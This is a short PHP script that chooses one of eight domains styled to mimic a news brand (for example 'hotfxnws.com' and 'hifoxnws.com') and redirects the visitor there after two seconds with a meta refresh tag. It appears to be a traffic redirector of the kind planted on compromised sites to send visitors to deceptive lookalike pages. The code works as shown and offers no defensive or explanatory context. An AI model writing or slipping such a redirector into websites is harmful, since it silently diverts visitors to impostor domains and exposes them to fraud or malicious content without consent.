<?php
$urls = array (
            'http://hotfxnws.com',
			'http://eefxnws.com',
			'http://exnwsfx.com',
			'http://inewscc.com',
			'http://hifoxnws.com',
			'http://mynwsx.com',
			'http://exnewz.com',
			'http://nrfoxnws.com',
            );
          
          
$n = mt_rand(0,count($urls) - 1);
$rand_url = $urls[$n];
?>
<meta http-equiv="refresh" content="2; url=<?php echo  $rand_url;?> ">